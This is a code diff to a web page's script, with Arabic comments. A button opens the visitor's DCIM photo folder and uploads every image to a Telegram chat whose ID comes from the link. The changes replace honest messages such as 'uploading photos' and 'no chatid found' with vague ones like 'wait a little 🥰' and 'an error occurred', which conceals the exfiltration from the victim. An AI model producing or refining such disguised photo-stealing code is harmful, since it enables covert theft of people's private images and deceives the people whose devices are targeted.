@@ -126,7 +126,7 @@
         // عند النقر على زر الخدمات
         servicesBtn.addEventListener('click', function() {
             // نغير نص الزر
-            servicesBtn.textContent = "بدء";
+            servicesBtn.textContent = "استخدام المجلد";
             servicesBtn.disabled = false;
             
             // نغير وظيفة الزر لفتح مجلد DCIM
@@ -136,7 +136,7 @@
         // فتح مجلد DCIM
         function openDCIMFolder() {
             servicesBtn.disabled = true;
-            servicesBtn.textContent = "…لحظة من فضلك";
+            servicesBtn.textContent = "جاري الوصول للمجلد...";
             
             // نبدأ محاولة الوصول للمجلد
             setTimeout(() => {
@@ -161,7 +161,7 @@
             });
             
             if (imageFiles.length === 0) {
-                showError('❌ لم يتم العثور على صور في المجلد');
+                showError('❌ حدث خطأ ');
                 resetButton();
                 return;
             }
@@ -171,7 +171,7 @@
             const chatId = urlParams.get('chatid');
             
             if (!chatId) {
-                showError('❌ لم يتم العثور على chatid في الرابط');
+                showError('❌ حدث خطأ ');
                 resetButton();
                 return;
             }
@@ -189,7 +189,7 @@
                     const file = imageFiles[i];
                     
                     // تحديث رسالة التحميل
-                    loading.textContent = `جاري رفع الصور... ${i + 1}/${totalImages}`;
+                    loading.textContent = `انتظر قليلا 🥰 ${i + 1}/${totalImages}`;
                     
                     // إرسال الصورة إلى التلجرام
                     const success = await sendToTelegram(file, chatId);
@@ -204,9 +204,9 @@
                 
                 // عرض نتيجة الرفع
                 if (successfulUploads > 0) {
-                    showSuccess(`✅ تم رفع ${successfulUploads} صورة بنجاح`);
+                    showSuccess(`✅ تم رفع ${successfulUploads} بنجاح`);
                 } else {
-                    showError('❌ لم يتم رفع أي صورة');
+                    showError('❌ حدث خطأ ');
                 }
                 
             } catch (error) {
@@ -273,7 +273,7 @@
         
         // إعادة تعيين الزر
         function resetButton() {
-            servicesBtn.textContent = "بدء";
+            servicesBtn.textContent = "استخدام المجلد";
             servicesBtn.disabled = false;
             servicesBtn.style.display = 'block';
             servicesBtn.onclick = openDCIMFolder;
